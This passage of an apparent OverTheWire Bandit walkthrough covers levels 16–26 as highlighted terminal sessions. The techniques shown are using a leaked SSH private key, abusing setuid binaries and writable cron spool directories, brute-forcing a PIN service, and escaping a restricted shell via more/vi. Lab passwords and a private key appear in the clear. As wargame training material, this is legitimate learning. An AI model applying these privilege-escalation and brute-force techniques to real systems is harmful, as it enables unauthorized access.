class="highlight-line">MIICBjCCAW+gAwIBAgIEOxBGEjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="highlight-line">b2NhbGhvc3QwHhcNMjAwNzExMTM1NjI4WhcNMjEwNzExMTM1NjI4WjAUMRIwEAYD</span><br><span class="highlight-line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBALjlJy1H</span><br><span class="highlight-line">hxygfKR5X5QT8dbHVAqKBGZPWUutQJE5E7Ic+xKGl1BAVFzJmbGnJ8cxHgpSubDW</span><br><span class="highlight-line">urtfkIPgu/vyyIhYn4jhmgkJOWuHc7mxRl64TVYfxMh6YpalOQ1aQeNsOtYgUoqA</span><br><span class="highlight-line">+aG3Sa4eCaBNawS+CgV6EEnx0LICSN7cTRATAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="highlight-line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="highlight-line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="highlight-line">DQEBBQUAA4GBAKHnag1vqMuJu3G3CTM/6pJWW14JvOoDwtTas8EgG6rLrBxNV8uU</span><br><span class="highlight-line">HutrzqeW9EANLBnQyDytynWzU9fNh1TWtEVku1X/TLizuQb5EGF6pRE1n6LF9ptJ</span><br><span class="highlight-line">CQkvW1CH8eOILuQcbPyjg+/43FM3ByVXtQmTEhORm7olAo8upbFLdTd0</span><br><span class="highlight-line">-----END CERTIFICATE-----</span><br><span class="highlight-line">subject=/CN=localhost</span><br><span class="highlight-line">issuer=/CN=localhost</span><br><span class="highlight-line">---</span><br><span class="highlight-line"></span><br><span class="highlight-line">No client certificate CA names sent</span><br><span class="highlight-line">Peer signing digest: SHA512</span><br><span class="highlight-line"></span><br><span class="highlight-line">Server Temp Key: X25519, 253 bits</span><br><span class="highlight-line">---</span><br><span class="highlight-line"></span><br><span class="highlight-line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="highlight-line"></span><br><span class="highlight-line">Verification error: self signed certificate</span><br><span class="highlight-line">---</span><br><span class="highlight-line"></span><br><span class="highlight-line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="highlight-line">Server public key is 1024 bit</span><br><span class="highlight-line">Secure Renegotiation IS supported</span><br><span class="highlight-line">Compression: NONE</span><br><span class="highlight-line">Expansion: NONE</span><br><span class="highlight-line">No ALPN negotiated</span><br><span class="highlight-line">SSL-Session:</span><br><span class="highlight-line">    Protocol  : TLSv1.2</span><br><span class="highlight-line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="highlight-line">    Session-ID: 5A593A7B626DC9D3AD7B828DDD37B36211FC544EF61030E07A7EB75DB9B76D0F</span><br><span class="highlight-line">    Session-ID-ctx:</span><br><span class="highlight-line">    Master-Key: 37DFFC6D6B5F3BE16333C74F33C83E47611833E55B0E34128D5521A8A40879708F71C3EE44F1CE1CD514D7C9826D1BE1</span><br><span class="highlight-line">    PSK identity: None</span><br><span class="highlight-line">    PSK identity hint: None</span><br><span class="highlight-line">    SRP username: None</span><br><span class="highlight-line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="highlight-line">    TLS session ticket:</span><br><span class="highlight-line">    0000 - 71 24 75 25 65 da ee 1d-04 f1 98 ed 3f 34 fb af   q$u%e.......?4..</span><br><span class="highlight-line">    0010 - f3 c4 c2 a1 07 59 c3 74-54 07 15 e7 40 fe ef 46   .....Y.tT...@..F</span><br><span class="highlight-line">    0020 - 5d f8 e1 50 8f 72 dc 86-fb e2 03 fe 77 d5 49 83   ]..P.r......w.I.</span><br><span class="highlight-line">    0030 - 29 11 93 00 5c cf aa d5-f4 25 ca 0a 27 e8 56 1e   )...\....%..'.V.</span><br><span class="highlight-line">    0040 - f1 fa b5 18 43 2a 49 1b-98 31 a2 4e 5c a1 c8 87   ....C*I..1.N\...</span><br><span class="highlight-line">    0050 - 90 a6 ab a6 1f 54 8e 6c-99 1c 60 c6 4d 18 8c 51   .....T.l..`.M..Q</span><br><span class="highlight-line">    0060 - b0 03 3c 2a 68 7f d1 47-da ae 33 6b 18 90 9b 52   ..<*h..G..3k...R</span><br><span class="highlight-line">    0070 - 33 33 3f 90 e4 d0 6f 52-63 b0 2b ed 92 ea 73 57   33?...oRc.+...sW</span><br><span class="highlight-line">    0080 - ea b0 06 39 2c af 9d 0d-75 36 2f e3 c6 f9 f4 b1   ...9,...u6/.....</span><br><span class="highlight-line">    0090 - 48 9e f1 d4 48 d3 cc e0-c4 d8 5a 3a d2 f8 80 47   H...H.....Z:...G</span><br><span class="highlight-line">Start Time: 1598752160</span><br><span class="highlight-line">Timeout   : 7200 (sec)</span><br><span class="highlight-line">Verify return code: 18 (self signed certificate)</span><br><span class="highlight-line">Extended master secret: yes</span><br><span class="highlight-line">Correct!</span><br><del class="highlight-line highlight-line-remove">-----BEGIN RSA PRIVATE KEY-----</del><br><del class="highlight-line highlight-line-remove">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</del><br><del class="highlight-line highlight-line-remove">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</del><br><del class="highlight-line highlight-line-remove">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</del><br><del class="highlight-line highlight-line-remove">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</del><br><del class="highlight-line highlight-line-remove">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</del><br><del class="highlight-line highlight-line-remove">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</del><br><del class="highlight-line highlight-line-remove">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</del><br><del class="highlight-line highlight-line-remove">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</del><br><del class="highlight-line highlight-line-remove">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</del><br><del class="highlight-line highlight-line-remove">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</del><br><del class="highlight-line highlight-line-remove">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</del><br><del class="highlight-line highlight-line-remove">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</del><br><del class="highlight-line highlight-line-remove">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</del><br><del class="highlight-line highlight-line-remove">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</del><br><del class="highlight-line highlight-line-remove">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</del><br><del class="highlight-line highlight-line-remove">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</del><br><del class="highlight-line highlight-line-remove">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</del><br><del class="highlight-line highlight-line-remove">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</del><br><del class="highlight-line highlight-line-remove">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</del><br><del class="highlight-line highlight-line-remove">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</del><br><del class="highlight-line highlight-line-remove">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</del><br><del class="highlight-line highlight-line-remove">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</del><br><del class="highlight-line highlight-line-remove">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</del><br><del class="highlight-line highlight-line-remove">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</del><br><del class="highlight-line highlight-line-remove">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</del><br><del class="highlight-line highlight-line-remove">-----END RSA PRIVATE KEY-----</del><br><span class="highlight-line"></span><br><span class="highlight-line">closed</span><br><span class="highlight-line">bandit16@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit16@bandit:~$ << EOF > id_rsa.key</ins><br><ins class="highlight-line highlight-line-add">heredoc> -----BEGIN RSA PRIVATE KEY-----</ins><br><ins class="highlight-line highlight-line-add">heredoc> MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</ins><br><ins class="highlight-line highlight-line-add">heredoc> imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</ins><br><ins class="highlight-line highlight-line-add">heredoc> Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</ins><br><ins class="highlight-line highlight-line-add">heredoc> DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</ins><br><ins class="highlight-line highlight-line-add">heredoc> JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</ins><br><ins class="highlight-line highlight-line-add">heredoc> x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</ins><br><ins class="highlight-line highlight-line-add">heredoc> KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</ins><br><ins class="highlight-line highlight-line-add">heredoc> J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</ins><br><ins class="highlight-line highlight-line-add">heredoc> d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</ins><br><ins class="highlight-line highlight-line-add">heredoc> YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</ins><br><ins class="highlight-line highlight-line-add">heredoc> vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</ins><br><ins class="highlight-line highlight-line-add">heredoc> +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</ins><br><ins class="highlight-line highlight-line-add">heredoc> 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</ins><br><ins class="highlight-line highlight-line-add">heredoc> SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</ins><br><ins class="highlight-line highlight-line-add">heredoc> HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</ins><br><ins class="highlight-line highlight-line-add">heredoc> SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</ins><br><ins class="highlight-line highlight-line-add">heredoc> R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</ins><br><ins class="highlight-line highlight-line-add">heredoc> Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</ins><br><ins class="highlight-line highlight-line-add">heredoc> R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</ins><br><ins class="highlight-line highlight-line-add">heredoc> L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</ins><br><ins class="highlight-line highlight-line-add">heredoc> blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</ins><br><ins class="highlight-line highlight-line-add">heredoc> YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</ins><br><ins class="highlight-line highlight-line-add">heredoc> 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</ins><br><ins class="highlight-line highlight-line-add">heredoc> dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</ins><br><ins class="highlight-line highlight-line-add">heredoc> vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</ins><br><ins class="highlight-line highlight-line-add">heredoc> -----END RSA PRIVATE KEY-----</ins><br><ins class="highlight-line highlight-line-add">heredoc> EOF</ins><br><span class="highlight-line">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17</span><br><del class="highlight-line highlight-line-remove">bandit16@bandit:~$ chmod 600 id_rsa.key</del><br><ins class="highlight-line highlight-line-add">bandit16@bandit:~$ ssh -i id_rsa.key bandit17@bandit.labs.overthewire.org -p 2220</ins><br><span class="highlight-line">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17</span><br><span class="highlight-line">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</span></code></pre>
<h3 id="level-17">Level 17 <a class="direct-link" href="#level-17">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Determine differences between files</span><br><span class="highlight-line">bandit17@bandit:~$ ls</span><br><span class="highlight-line">passwords.new  passwords.old</span><br><span class="highlight-line">bandit17@bandit:~$ ls -la</span><br><span class="highlight-line">total 36</span><br><span class="highlight-line">drwxr-xr-x  3 root     root     4096 Jul 11 15:56 .</span><br><span class="highlight-line">drwxr-xr-x 41 root     root     4096 May  7 20:14 ..</span><br><span class="highlight-line">-rw-r-----  1 bandit17 bandit17   33 Jul 11 15:56 .bandit16.password</span><br><span class="highlight-line">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span><br><span class="highlight-line">-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc</span><br><span class="highlight-line">-rw-r-----  1 bandit18 bandit17 3300 May  7 20:14 passwords.new</span><br><span class="highlight-line">-rw-r-----  1 bandit18 bandit17 3300 May  7 20:14 passwords.old</span><br><span class="highlight-line">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span><br><span class="highlight-line">drwxr-xr-x  2 root     root     4096 Jul 11 15:56 .ssh</span><br><ins class="highlight-line highlight-line-add">bandit17@bandit:~$ diff passwords.new passwords.old</ins><br><span class="highlight-line">42c42</span><br><span class="highlight-line"></span><br><span class="highlight-line">< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br><span class="highlight-line">---</span><br><span class="highlight-line">> w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii</span></code></pre>
<h3 id="level-18">Level 18 <a class="direct-link" href="#level-18">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Bypass ssh logout from .bashrc configuration</span><br><span class="highlight-line">bandit17@bandit:~$ ssh bandit18@localhost</span><br><span class="highlight-line">Enjoy your stay!</span><br><span class="highlight-line">Byebye !</span><br><span class="highlight-line">Connection to localhost closed.</span><br><span class="highlight-line">bandit17@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit17@bandit:~$ ssh -t bandit18@localhost /bin/sh</ins><br><span class="highlight-line">$ </span><br><span class="highlight-line">$ whoami</span><br><span class="highlight-line">bandit18</span><br><span class="highlight-line">$ ls</span><br><span class="highlight-line">readme</span><br><span class="highlight-line">$ cat readme</span><br><span class="highlight-line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span></code></pre>
<h3 id="level-19">Level 19 <a class="direct-link" href="#level-19">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: use setUID bit binary</span><br><span class="highlight-line">bandit19@bandit:~$ ls</span><br><span class="highlight-line">bandit20-do</span><br><span class="highlight-line">bandit19@bandit:~$ ls -la bandit20-do</span><br><span class="highlight-line">-rwsr-x--- 1 bandit20 bandit19 7296 May  7 20:14 bandit20-do</span><br><span class="highlight-line">bandit19@bandit:~$ file bandit20-do</span><br><span class="highlight-line">bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped</span><br><span class="highlight-line">bandit19@bandit:~$ ./bandit20-do</span><br><span class="highlight-line">Run a command as another user.</span><br><span class="highlight-line">  Example: ./bandit20-do id</span><br><span class="highlight-line">bandit19@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit19@bandit:~$ ./bandit20-do /bin/cat /etc/bandit_pass/bandit20</ins><br><span class="highlight-line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span></code></pre>
<h3 id="level-20">Level 20 <a class="direct-link" href="#level-20">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Create a socket listener as a background job </span><br><span class="highlight-line">bandit20@bandit:~$ ls</span><br><span class="highlight-line">suconnect</span><br><span class="highlight-line">bandit20@bandit:~$ ls -la suconnect</span><br><span class="highlight-line">-rwsr-x--- 1 bandit21 bandit20 12088 May  7 20:14 suconnect</span><br><span class="highlight-line">bandit20@bandit:~$ ./suconnect</span><br><span class="highlight-line">Usage: ./suconnect <portnumber></span><br><span class="highlight-line">This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.</span><br><span class="highlight-line">bandit20@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -lvp 8888 &</ins><br><span class="highlight-line">[1] 4975</span><br><span class="highlight-line">bandit20@bandit:~$ listening on [any] 8888 ...</span><br><span class="highlight-line"></span><br><ins class="highlight-line highlight-line-add">bandit20@bandit:~$ ./suconnect 8888</ins><br><span class="highlight-line">connect to [127.0.0.1] from localhost [127.0.0.1] 36356</span><br><span class="highlight-line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="highlight-line">Password matches, sending next password</span><br><span class="highlight-line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br><span class="highlight-line">[1]+  Done                    echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -lvp 8888</span><br><span class="highlight-line">bandit20@bandit:~$</span></code></pre>
<h3 id="level-21">Level 21 <a class="direct-link" href="#level-21">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Inspect scheduled jobs/tasks</span><br><span class="highlight-line">bandit21@bandit:~$ ls /etc/cron.d/</span><br><span class="highlight-line">cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root</span><br><ins class="highlight-line highlight-line-add">bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22</ins><br><span class="highlight-line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null</span><br><span class="highlight-line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null</span><br><ins class="highlight-line highlight-line-add">bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh</ins><br><span class="highlight-line">#!/bin/bash</span><br><span class="highlight-line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="highlight-line">cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span></code></pre>
<h3 id="level-22">Level 22 <a class="direct-link" href="#level-22">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Inspect scheduled jobs/tasks</span><br><span class="highlight-line">bandit22@bandit:~$ ls /etc/cron.d/</span><br><span class="highlight-line">cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root</span><br><ins class="highlight-line highlight-line-add">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23</ins><br><span class="highlight-line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null</span><br><span class="highlight-line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null</span><br><ins class="highlight-line highlight-line-add">bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh</ins><br><span class="highlight-line">#!/bin/bash</span><br><span class="highlight-line"></span><br><span class="highlight-line">myname=$(whoami)</span><br><span class="highlight-line">mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)</span><br><span class="highlight-line"></span><br><span class="highlight-line">echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"</span><br><span class="highlight-line"></span><br><span class="highlight-line">cat /etc/bandit_pass/$myname > /tmp/$mytarget</span><br><span class="highlight-line"></span><br><ins class="highlight-line highlight-line-add">bandit22@bandit:~$ ls -la /usr/bin/cronjob_bandit23.sh</ins><br><span class="highlight-line">-rwxr-x--- 1 bandit23 bandit22 211 May  7 20:14 /usr/bin/cronjob_bandit23.sh</span><br><del class="highlight-line highlight-line-remove">bandit22@bandit:~$ myname=bandit23</del><br><del class="highlight-line highlight-line-remove">bandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)</del><br><span class="highlight-line">bandit22@bandit:~$ echo $mytarget</span><br><span class="highlight-line">8ca319486bfbbc3663ea0fbe81326349</span><br><ins class="highlight-line highlight-line-add">bandit22@bandit:~$ cat /tmp/$mytarget</ins><br><span class="highlight-line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span></code></pre>
<h4 id="level-23">Level 23 <a class="direct-link" href="#level-23">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Inspect and manipulate scheduled jobs/tasks</span><br><span class="highlight-line"># Key insight: permissions on interpretted scripts</span><br><span class="highlight-line">bandit23@bandit:~$ ls /etc/cron.d/</span><br><span class="highlight-line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="highlight-line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24</ins><br><span class="highlight-line">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null</span><br><span class="highlight-line">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null</span><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh</ins><br><span class="highlight-line">#!/bin/bash</span><br><span class="highlight-line"></span><br><span class="highlight-line">myname=$(whoami)</span><br><span class="highlight-line"></span><br><span class="highlight-line">cd /var/spool/$myname</span><br><span class="highlight-line">echo "Executing and deleting all scripts in /var/spool/$myname:"</span><br><span class="highlight-line">for i in * .*;</span><br><span class="highlight-line">do</span><br><span class="highlight-line">    if [ "$i" != "." -a "$i" != ".." ];</span><br><span class="highlight-line">    then</span><br><span class="highlight-line">        echo "Handling $i"</span><br><span class="highlight-line">        owner="$(stat --format "%U" ./$i)"</span><br><span class="highlight-line">        if [ "${owner}" = "bandit23" ]; then</span><br><span class="highlight-line">            timeout -s 9 60 ./$i</span><br><span class="highlight-line">        fi</span><br><span class="highlight-line">        rm -f ./$i</span><br><span class="highlight-line">    fi</span><br><span class="highlight-line">done</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit23@bandit:~$</span><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ vi tmp/a130mb.sh  # create script</ins><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ cat /tmp/a130mb.sh</ins><br><span class="highlight-line">    #!/bin/sh</span><br><span class="highlight-line"></span><br><span class="highlight-line">    cp /etc/bandit_pass/bandit24 /tmp/a130mb.txt</span><br><span class="highlight-line">    chmod 777 /tmp/a130mb.txt</span><br><span class="highlight-line"></span><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ chmod +x /tmp/a130mb.sh</ins><br><ins class="highlight-line highlight-line-add">bandit23@bandit:~$ cp /tmp/a130mb.sh /var/spool/bandit24/a130mb.sh</ins><br><del class="highlight-line highlight-line-remove">bandit23@bandit:~$ watch cat /tmp/a130mb.txt</del><br><span class="highlight-line">bandit23@bandit:~$ cat /tmp/a130mb.txt</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span></code></pre>
<h4 id="level-24">Level 24 <a class="direct-link" href="#level-24">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Brute force a service </span><br><span class="highlight-line"># Key insight: Generate a wordlist </span><br><ins class="highlight-line highlight-line-add">bandit24@bandit:~$ PASS=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</ins><br><ins class="highlight-line highlight-line-add">bandit24@bandit:~$ for PIN in {0000..9999}; do</ins><br><ins class="highlight-line highlight-line-add">> echo $PASS $PIN</ins><br><ins class="highlight-line highlight-line-add">> done > /tmp/a130mb.txt</ins><br><span class="highlight-line">bandit24@bandit:~$</span><br><span class="highlight-line">bandit24@bandit:~$ head /tmp/a130mb.txt</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008</span><br><span class="highlight-line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009</span><br><ins class="highlight-line highlight-line-add">bandit24@bandit:~$ cat /tmp/a130mb.txt | nc localhost 30002</ins><br><span class="highlight-line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="highlight-line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="highlight-line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="highlight-line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="highlight-line">Correct!</span><br><span class="highlight-line">The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span><br><span class="highlight-line"></span><br><span class="highlight-line">Exiting.</span><br><span class="highlight-line">bandit24@bandit:~$</span></code></pre>
<h3 id="level-25-26">Level 25-26 <a class="direct-link" href="#level-25-26">#</a></h3>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: escape default login shell </span><br><span class="highlight-line"># Key insight: /etc/passwd; more has access to vi; vi has access to shell</span><br><span class="highlight-line">bandit25@bandit:~$ ls</span><br><span class="highlight-line">bandit26.sshkey</span><br><span class="highlight-line">bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost</span><br><span class="highlight-line">...</span><br><span class="highlight-line">Connection to localhost closed</span><br><span class="highlight-line">bandit25@bandit:~$ cat /etc/passwd | grep bandit26</span><br><span class="highlight-line">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showshell/</span><br><span class="highlight-line">bandit25@bandit:~$ file /usr/bin/showshell/</span><br><span class="highlight-line">/usr/bin/showshell/: POSIX shell script, ASCII shell/ executable</span><br><span class="highlight-line">bandit25@bandit:~$ cat /usr/bin/showshell/</span><br><span class="highlight-line">#!/bin/sh</span><br><span class="highlight-line"></span><br><span class="highlight-line">export TERM=linux</span><br><span class="highlight-line"></span><br><span class="highlight-line">more ~/shell/.txt</span><br><span class="highlight-line">exit 0</span><br><mark class="highlight-line highlight-line-active">bandit25@bandit:~$ # resize screen; enter more's vim mode</mark><br><mark class="highlight-line highlight-line-active">v </mark><br><mark class="highlight-line highlight-line-active">:set shell=/bin/bash</mark><br><mark class="highlight-line highlight-line-active">:shell</mark><br><span class="highlight-line">bandit26@bandit:~$ cat /etc/bandit_pass/bandit26</span><br><span 